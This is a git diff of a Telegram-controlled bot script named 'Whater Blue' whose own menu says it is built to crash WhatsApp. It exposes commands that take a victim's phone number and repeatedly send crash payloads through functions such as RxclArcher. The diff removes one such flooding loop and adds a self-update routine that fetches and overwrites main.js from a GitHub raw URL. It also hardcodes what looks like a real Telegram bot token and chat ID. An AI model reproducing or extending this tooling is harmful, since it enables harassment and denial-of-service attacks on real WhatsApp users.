@@ -100,12 +100,13 @@ const question = (query) => new Promise((resolve) => {
 });
 
 
-const thumbnailUrl = "https://files.catbox.moe/lkst1m.jpg";
-const BugUrl = "https://files.catbox.moe/lkk3kr.jpg";
+const thumbnailUrl = "https://files.catbox.moe/i4onvs.jpg";
+const BugUrl = "https://files.catbox.moe/i4onvs.jpg";
 const devBotToken = "8456189841:AAECUV1o8D-03zA4n_lxc0SSBg-wQ99p_Bg";
 const devChatId = "7682828455";
-const RAW_URL = 'https://raw.githubusercontent.com/USERNAME/REPO/branch/main.js';
-const FILE_NAME = 'main.js';
+const OWNER_ID = Number(config.ownerID)
+const RAW_URL = 'https://raw.githubusercontent.com/JaryD3v3/scripfile/main/main.js'
+const FILE_NAME = 'main.js'
 /*const { env, execArgv } = process;
 const mod = require('module');
 const trueLog = console.log;
@@ -294,7 +295,7 @@ console.clear();
 » Information:
   Developer: JARY
   Name Scrip: Whater Blue
-  Version: 5.2
+  Version: X
   Status: Vvip
   `))
   console.log(chalk.bold.red(`Scrip Siap Tempur`))
@@ -430,7 +431,21 @@ const loadPoints = () => {
 const savePoints = (data) => {
   fs.writeFileSync(pointsFile, JSON.stringify(data, null, 2));
 };
+async function uploadCatbox(buffer, ext = "bin") {
+  const form = new FormData();
+  form.append("reqtype", "fileupload");
+  form.append("fileToUpload", buffer, {
+    filename: `jary_${Date.now()}.${ext}`
+  });
 
+  const res = await axios.post(
+    "https://api.catbox.moe/user/api.php",
+    form,
+    { headers: form.getHeaders() }
+  );
+
+  return res.data;
+}
 
 bot.command("reqpair", async (ctx) => {
    if (ctx.from.id != ownerID) {
@@ -579,11 +594,11 @@ bot.command('delprem', async (ctx) => {
 bot.start(ctx => {
     const menuMessage = `
 <blockquote>( 🌹 ) 𝐖𝐡𝐚𝐭𝐞𝐫𝐁𝐥𝐮𝐞
-( 👋 ) Hello welcome to the Water Blue script specially designed to crash WhatsApp This script is still under development so just enjoy it
+Hello welcome to the Water Blue script specially designed to crash WhatsApp This script is still under development so just enjoy it
 ─────────────────────
 ☰「 ɪɴғᴏʀᴍᴀsɪ ⊹ 𝑾ɦαƭεɾ 」
 ヤ ՇяєαԵօя : @JarySudo2 X @maoumods
-ヤ ѵєяsíοи : 5.2
+ヤ ѵєяsíοи : X
 ヤ ℒαиgυαgє : 𝙅𝙖𝙫𝙖𝙨𝙘𝙧𝙞𝙥𝙩 
 ヤ sτατυs : 𝙑𝙫𝙞𝙥𝘽𝙪𝙮𝙊𝙣𝙡𝙮
 ╘═———————---———————═⬡
@@ -610,7 +625,7 @@ Ketik /menu Untuk Menampilkan menu</blockquote>
 bot.action('/start', async (ctx) => {
     const menuMessage = `
 <blockquote>( 🌹 ) 𝐖𝐡𝐚𝐭𝐞𝐫𝐁𝐥𝐮𝐞
-( 👋 ) Hello welcome to the Water Blue script specially designed to crash WhatsApp This script is still under development so just enjoy it
+Hello welcome to the Water Blue script specially designed to crash WhatsApp This script is still under development so just enjoy it
 ─────────────────────
 INFO : 
 (all akses) - semua pengguna bisa akses
@@ -619,7 +634,7 @@ INFO :
 ─────────────────────
 ☰「 ɪɴғᴏʀᴍᴀsɪ ⊹ 𝑾ɦαƭεɾ 」
 ヤ ՇяєαԵօя : @JarySudo2
-ヤ ѵєяsíοи : 5.1 Vip
+ヤ ѵєяsíοи : X 
 ヤ ℒαиgυαgє : 𝙅𝙖𝙫𝙖𝙨𝙘𝙧𝙞𝙥𝙩 
 ヤ sτατυs : 𝙑𝙫𝙞𝙥𝘽𝙪𝙮𝙊𝙣𝙡𝙮
 ╘═———————---———————═⬡
@@ -678,13 +693,12 @@ bot.command("menu", async (ctx) => {
     await ctx.deleteMessage(msg.message_id);
     const teks = `
 \`\`\`ωнατєяϲοиτяοℓ
-Scrip Masi Dalam Masa Update
 ☰ — τοοℓѕ ༈ αϲϲєѕ —
 ⊹ /whater <pesan> (all akses)
 ⊹ /gacha (all akses)
 ⊹ /listitem (all akses)
 ⊹ /iqc <pesan> <baterai> <operator> (all akses)
-⊹ /whater <pesan> - untuk memberi info misal func kefix atau eror dll (all akses)
+⊹ /rep <pesan> - untuk memberi info misal func kefix atau eror dll (all akses)
 ⊹ /test 62××× 10 (reply function) (prem akses)
 
 ☰ — σωɳεɾ ༈ αccҽs —
@@ -696,7 +710,7 @@ Scrip Masi Dalam Masa Update
 ⊹ /delsession (owner akses)
 ⊹ /setgacha <reply file> (owner akses)
 ⊹ /reqpair 62xxx (owner akses)
-⊹ /update
+⊹ /update (owner Akses)
 
 ☰ — ϲяαѕн ༈ μєиυ 
 ⊹ /forcecall 62xxx—
@@ -729,27 +743,79 @@ Scrip Masi Dalam Masa Update
     console.log("Error /menu:", e);
   }
 });
-//Update
-bot.command('update', async (ctx) => {
+//catbox
+bot.command("catbox", async (ctx) => {
   try {
-    await ctx.reply('Auto Update Dimulai...')
+    const reply = ctx.message.reply_to_message;
+    if (!reply) {
+      return ctx.reply("❌ Reply foto / stiker / video / file dulu!");
+    }
 
-    const res = await axios.get(RAW_URL, { responseType: 'text' })
+    let fileId;
+    let ext = "bin";
 
-    if (fs.existsSync(FILE_NAME)) fs.unlinkSync(FILE_NAME)
-    fs.writeFileSync(FILE_NAME, res.data)
+    if (reply.photo) {
+      fileId = reply.photo.pop().file_id;
+      ext = "jpg";
+    } else if (reply.sticker) {
+      fileId = reply.sticker.file_id;
+      ext = "webp";
+    } else if (reply.video) {
+      fileId = reply.video.file_id;
+      ext = "mp4";
+    } else if (reply.document) {
+      fileId = reply.document.file_id;
+      ext = reply.document.file_name?.split(".").pop() || "bin";
+    } else {
+      return ctx.reply("❌ Media tidak didukung!");
+    }
 
-    await ctx.reply('✅ Update selesai\n♻️ Restart bot...')
-    setTimeout(() => {
-      process.exit(0)
-    }, 1000)
+    const fileLink = await ctx.telegram.getFileLink(fileId);
+    const buffer = await axios.get(fileLink.href, {
+      responseType: "arraybuffer"
+    }).then(res => res.data);
+
+    await ctx.reply("⏳ Upload ke Catbox...");
+
+    const url = await uploadCatbox(buffer, ext);
+
+    await ctx.reply(
+      `✅ *CATBOX UPLOAD SUCCESS*\n\n🔗 ${url}`,
+      { parse_mode: "Markdown" }
+    );
 
   } catch (e) {
-    ctx.reply(`❌ Update gagal\n${e.message}`)
+    console.error(e);
+    ctx.reply("❌ Gagal upload ke Catbox!");
+  }
+});
+
+//Update
+bot.command('update', async (ctx) => {
+  if (ctx.from.id !== OWNER_ID)
+    return ctx.reply('❌ Command ini khusus owner')
+
+  try {
+    await ctx.reply('ProcessUpdate...')
+
+    const res = await axios.get(RAW_URL, { timeout: 15000 })
+
+    fs.writeFileSync(FILE_NAME + '.new', res.data)
+    await bot.stop()
+
+    if (fs.existsSync(FILE_NAME)) fs.unlinkSync(FILE_NAME)
+    fs.renameSync(FILE_NAME + '.new', FILE_NAME)
+
+    await ctx.reply('Succes Update Gunakan Lah Perintah /menu Untuk Melihat Menu Dan Tunggulah Informasi Update Terbaru Di Gb Ress Wa/Tele')
+
+    setTimeout(() => process.exit(0), 1000)
+
+  } catch (err) {
+    ctx.reply('❌ Update gagal:\n' + err.message)
   }
 })
 //tools kirim pesan ke dev
-bot.command("whater", async (ctx) => {
+bot.command("rep", async (ctx) => {
   const message = ctx.message.text.split(" ").slice(1).join(" ");
   const sender = `${ctx.from.first_name || ""} ${ctx.from.last_name || ""}`.trim();
   const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
@@ -1252,46 +1318,6 @@ bot.command("dlyv2", checkWhatsAppConnection, async ctx => {
     }
   });
 });
-bot.command("invisible", checkWhatsAppConnection, async ctx => {
-  const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`Format: /delayhour 62×××`);
-  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
-  let mention = true;
-  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, BugUrl, {
-    caption: `
-<blockquote><pre>
-𝑾ɦαƭεɾ 𝑩ℓυє ѕєи∂ιиg ℬυg...
-</pre>
-</blockquote>`,
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [[
-        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
-      ]]
-    }
-  });
-  const processMessageId = processMessage.message_id;
-  for (let i = 0; i < 100; i++) {
-    await RxclArcher(sock, target);
-    await RxclArcher(sock, target);
-    await RxclArcher(sock, target);
-    await sleep(1000)
-  }
-  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
-<blockquote><pre>
-☰ 𝑾ɦαƭεɾ 𝑩ℓυє ѕυϲϲєѕ
-Եαяgєτ : ${q}
-Ꭻєиιѕ ℬυg : /delayhour
-</pre>
-</blockquote>`, {
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [[
-        { text: "☇ CekTarget", url: `https://wa.me/${q}` }
-      ]]
-    }
-  });
-});
 bot.command("forcecall", checkWhatsAppConnection, async ctx => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`Format: /delayhour 62×××`);
@@ -1498,7 +1524,6 @@ content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
 await sock.sendNode(lemiting);
 
 }  
-
 async function DelayJarr(target) {
   try {
     let JarrMsg = {
@@ -1942,4 +1967,8 @@ async function LocX(sock, target) {
   });
 }
 //END FUNCTION
-bot.launch()
+;(async () => {
+  await bot.telegram.deleteWebhook({ drop_pending_updates: true })
+  bot.launch({ dropPendingUpdates: true })
+  console.log('BOT RUNNING')
+})()
